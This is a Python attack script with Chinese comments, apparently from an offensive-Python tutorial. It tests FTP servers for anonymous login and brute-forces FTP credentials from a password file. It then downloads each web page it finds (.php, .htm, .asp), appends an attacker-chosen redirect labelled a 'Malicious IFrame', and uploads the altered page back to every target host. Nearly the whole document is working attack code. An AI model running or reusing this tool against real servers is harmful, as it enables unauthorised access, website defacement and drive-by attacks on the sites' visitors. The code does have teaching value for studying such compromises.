"""我们可以利用 Python 的 ftplib 模块来构建一个小脚本，用来确
认服务器是否允许匿名登录,函数 anonLogin()接受一个主机名反汇编一个布
尔值来确认主机是否允许匿名登录,为了确认这个布尔值，这个函数尝试用匿
名认证生成一个 FTP 连接，如果成功，则返回“True”，产生异常则返回
# “False”。 """
# import ftplib
# def anonLogin(hostname):
#  try:
#     ftp = ftplib.FTP(hostname)
#     ftp.login('anonymous', 'me@your.com')
#     print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded!')
#     ftp.quit()
#     return True
#  except Exception as e:
#     print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed!')
#  return False
# host = '192.168.95.179'
# anonLogin(host)
"""anonLogin()函数建立名为 brutelogin()的函数。
这个函数接受主机名和密码文件作为输入返回允许访问主机的证书。注意，函
数迭代文件的每一行，用冒号分割用户名和密码，然后这个函数用用户名和密
码尝试登陆 FTP 服务器。如果成功，将返回用户名和密码的元组，如果失败有
异常，将继续测试下一行。如果遍历完所有的用户名和密码都没有成功，则返
回包含 None 的元组"""
# import ftplib
#
# def bruteLogin(hostname, passwdFile):
#     pF = open(passwdFile, 'r')
#  for line in pF.readlines():
#     userName = line.split(':')[0]
#     passWord = line.split(':')[1].strip('\r').strip('\n')
#     print("[+] Trying: " + userName + "/" + passWord)
#     try:
#         ftp = ftplib.FTP(hostname)
#         ftp.login(userName, passWord)
#         print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + "/" + passWord)
#         ftp.quit()
#         return (userName, passWord)
#     except Exception as e:
#         pass
#  print('\n[-] Could not brute force FTP credentials.')
#  return (None, None)
#
# host = '192.168.95.179'
# passwdFile = 'userpass.txt'
# bruteLogin(host, passwdFile)

import ftplib
import optparse
import time
def anonLogin(hostname):  # 匿名登陆
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
        return False
def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: '+userName+'/'+passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
        print('\n[-] Could not brute force FTP credentials.')
        return (None, None)
def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
        retList.append(fileName)
    return retList
def injectPage(ftp, page, redirect):
 f = open(page + '.tmp', 'w')
 ftp.retrlines('RETR ' + page, f.write)
 print('[+] Downloaded Page: ' + page)
 f.write(redirect)
 f.close()
 print('[+] Injected Malicious IFrame on: ' + page)
 ftp.storlines('STOR ' + page, open(page + '.tmp'))
 print('[+] Uploaded Injected Page: ' + page)
def attack(username, password, tgtHost, redirect):
 ftp = ftplib.FTP(tgtHost)
 ftp.login(username, password)
 defPages = returnDefault(ftp)
 for defPage in defPages:
    injectPage(ftp, defPage, redirect)
def main():
 parser = optparse.OptionParser('usage%prog -H <target host[s]> -r <redirect page> [-f <userpass file>]')
 parser.add_option('-H', dest='tgtHosts', type='string',
help='specify target host')
 parser.add_option('-f', dest='passwdFile', type='string',
help='specify user/password file')
 parser.add_option('-r', dest='redirect', type='string',
help='specify a redirection page')
 (options, args) = parser.parse_args()
 tgtHosts = str(options.tgtHosts).split(', ')
 passwdFile = options.passwdFile
 redirect = options.redirect
 if tgtHosts == None or redirect == None:
    print(parser.usage)
    exit(0)
 for tgtHost in tgtHosts:
    username = None
    password = None
    if anonLogin(tgtHost) == True:
        username = 'anonymous'
        password = 'me@your.com'
        print('[+] Using Anonymous Creds to attack')
        attack(username, password, tgtHost, redirect)
    elif passwdFile != None:
        (username, password) = bruteLogin(tgtHost, passwdFile)
    if password != None:
        print('[+] Using Creds: ' + username + '/' +password + ' to attack')
        attack(username, password, tgtHost, redirect)
if __name__ == '__main__':
    main()